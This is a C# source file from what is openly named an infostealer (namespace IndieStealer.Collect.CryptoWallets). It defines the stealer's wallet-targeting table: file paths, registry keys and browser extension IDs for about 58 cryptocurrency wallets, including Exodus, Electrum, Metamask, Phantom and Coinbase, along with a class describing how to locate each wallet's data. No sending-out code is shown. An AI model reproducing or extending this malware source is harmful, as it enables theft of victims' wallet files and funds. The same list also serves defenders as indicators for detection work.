using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.VisualBasic.ApplicationServices;

namespace IndieStealer.Collect.CryptoWallets
{

    class CWalletList
    {
        protected internal static List<CWalletData> CWalletCredentials = new List<CWalletData>()
        {
            new CWalletData("Armory",Info.Appdata + "\\Armory",true,true,false, new List<string>(){".wallet",".lmdb",".lmdb-lock"}),
            new CWalletData("Atomic",Info.Appdata + "\\atomic\\Local Storage\\leveldb",false,false,false),
            new CWalletData("Binance","fhbohimaelbohpjbbldcngcnapndodjp",true),
            new CWalletData("BitcoinCore","SOFTWARE\\Bitcoin\\Bitcoin-Qt",true,false,true),
            new CWalletData("Bytecoin",Info.Appdata + "\\bytecoin",true,true,false,new List<string>(){".wallet"}),
            new CWalletData("Coinomi",Info.AppdataLocal + "\\Coinomi\\Coinomi\\wallets",true,true,false),
            new CWalletData("DogecoinCore","SOFTWARE\\Dogecoin\\Dogecoin-Qt",true,false,true),
            new CWalletData("Electrum",Info.Appdata + "\\Electrum\\",true,true,new CWalletData.HybridConstruction(){parameters = new string[]{"wallets","config"},cType = CWalletData.HybridConstruction.CType.DIR_AND_FILE}),
            new CWalletData("Etherwall","SOFTWARE\\Etherdyne\\Etherwall\\geth",true, true,new CWalletData.HybridConstruction(){parameters = new string[]{"datadir","\\keystore"},cType = CWalletData.HybridConstruction.CType.REGISTRY_AND_FILE}),
            new CWalletData("Exodus",Info.Appdata + "\\Exodus\\exodus.wallet",false,false,false),
            new CWalletData("Jaxx",Info.Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\",true,true,false),
            new CWalletData("LitecoinCore","Software\\Litecoin\\Litecoin-Qt",true,false,true),
            new CWalletData("Metamask","nkbihfbeogaeaoehlefnkodbefgpgknn",true),
            new CWalletData("Monero","Software\\monero-project\\monero-core",false,false,true, regValueName:"wallet_path"),
            new CWalletData("Phantom","bfnaelmomeimhlpmgjnjophhpkkoljpa",true),
            new CWalletData("QtumCore", "SOFTWARE\\Qtum\\Qtum-Qt",true,false,true),
            new CWalletData("Tronlink","ibnejdfjmmkpcnlpebklmnkoeoihofec",true),
            new CWalletData("Zcash",Info.Appdata + "\\Zcash\\",true,true,false),
            new CWalletData("Yoroi","ffnbelfdoeiohenkjibnmadjiehjhajb",true),
            new CWalletData("Nifty","jbdaocneiiinmjbjlgalhcelgbejmnid",true),
            new CWalletData("Math","afbcbjpbpfadlkmhmclhkeeodmamcflc",true),
            new CWalletData("Coinbase","hnfanknocfeofbddgcijnmhnfnkdnaad",true),
            new CWalletData("Guarda","hpglfhgfnhbgpjdenjgmdgoeiappafln",true),
            new CWalletData("EQUAL","blnieiiffboillknjnepogjhkgnoapac",true),
            new CWalletData("Jaxx Liberty","cjelfplplebdjjenllpjcblmjkfcffne",true),
            new CWalletData("BitApp","fihkakfobkmkjojpchpfgcmhfjnmnfpi",true),
            new CWalletData("iWallet","kncchdigobghenbbaddojjnnaogfppfj",true),
            new CWalletData("Wombat","amkmjjmmflddogmhpjloimipbofnfjih",true),
            new CWalletData("MEW CX","nlbmnnijcnlegkjjpcfjclmcfggfefdm",true),
            new CWalletData("GuildWallet","nanjmdknhkinifnkgdcggcfnhdaammmj",true),
            new CWalletData("Saturn","nkddgncdjgjfcddamfgcmfnlhccnimig",true),
            new CWalletData("Ronin","fnjhmkhhmkbjkkabndcnnogagogbneec",true),
            new CWalletData("NeoLine","cphhlgmgameodnhkjdmkpanlelnlohao",true),
            new CWalletData("Clover","nhnkbkgjikgcigadomkphalanndcapjk",true),
            new CWalletData("Liquality","kpfopkelmapcoipemfendmdcghnegimn",true),
            new CWalletData("Terra Station","aiifbnbfobpmeekipheeijimdpnlpgpp",true),
            new CWalletData("Keplr","dmkamcknogkgcdfhhbddcghachkejeap",true),
            new CWalletData("Sollet","fhmfendgdocmcbmfikdcogofphimnkno",true),
            new CWalletData("Auro","cnmamaachppnkjgnildpdmkaakejnhae",true),
            new CWalletData("Polymesh","jojhfeoedkpkglbfimdfabpdfjaoolaf",true),
            new CWalletData("ICONex","flpiciilemghbmfalicajoolhkkenfel",true),
            new CWalletData("Nabox","nknhiehlklippafakaeklbeglecifhad",true),
            new CWalletData("KHC","hcflpincpppdclinealmandijcmnkbgn",true),
            new CWalletData("Temple","ookjlbkiijinhpmnjffcofjonbfbgaoc",true),
            new CWalletData("TezBox","mnfifefkajgofkcjkemidiaecocnkjeh",true),
            new CWalletData("Cyano","dkdedlpgdmmkkfjabffeganieamfklkm",true),
            new CWalletData("Byone","nlgbhdfgdhgbiamfdfmbikcdghidoadd",true),
            new CWalletData("OneKey","infeboajgfhgbjpjbeppbkgnabfdkdaf",true),
            new CWalletData("LeafWallet","cihmoadaighcejopammfbmddcmdekcje",true),
            new CWalletData("DAppPlay","lodccjjbdhfakaekdiahmedfbieldgik",true),
            new CWalletData("BitClip","ijmpgkjfkbfhoebgogflfebnmejmfbml",true),
            new CWalletData("Steem Keychain","lkcjlnjfpbikmcmbachjpdbijejflpcm",true),
            new CWalletData("Nash Extension","onofpnbbkehpmmoabgpcpmigafmmnjhl",true),
            new CWalletData("Hycon Lite Client","bcopgchhojmggmffilplmbdicgaihlkp",true),
            new CWalletData("ZilPay","klnaejjgbibmhlephnhpmaofohgkpgkd",true),
            new CWalletData("Coin98","aeachknmefphepccionboohckonoeemg",true)
        };

    }

    class CWalletData
    {
        public string Name { get; set; }
        public string Path { get; set; }

        public string[] Data { get; set; }
        public bool IsFile { get; set; }
        public bool IsDataMultiple { get; set; }
        public bool IsStoredInRegistry { get; set; }
        public List<string> Extensions { get; set; }
        public string RegValueName { get; set; }
        public HybridConstruction hybridConstruction { get; set; }
        public bool IsExtension { get; set; }

        public Dictionary<string, string[]> profileNamesAndData { get; set; } = null;
        public class HybridConstruction
        {
            public string[] parameters { get; set; }
            public CType cType { get; set; }
            public enum CType
            {
                DIR_AND_FILE,
                REGISTRY_AND_FILE
            }
             
        }

        public CWalletData(string name, string path, bool isFile, bool isDataMultiple, HybridConstruction hybridConstruction)
        {
            this.Name = name;
            this.Path = path;
            this.IsFile = isFile;
            this.IsDataMultiple = isDataMultiple;
            this.hybridConstruction = hybridConstruction;
        }
        public CWalletData(string name, string path, bool isFile, bool isDataMultiple, bool isStoredInRegistry, List<string> extensions = null, string regValueName = null)
        {
            this.Name = name;
            this.Path = path;
            this.IsFile = isFile;
            this.IsDataMultiple = isDataMultiple;
            this.IsStoredInRegistry = isStoredInRegistry;
            this.Extensions = extensions;
            this.RegValueName = regValueName;
        }
        public CWalletData(string name, string path, bool isExtension)
        {
            this.Name = name;
            this.Path = path;
            this.IsExtension = isExtension;
        }
    }
}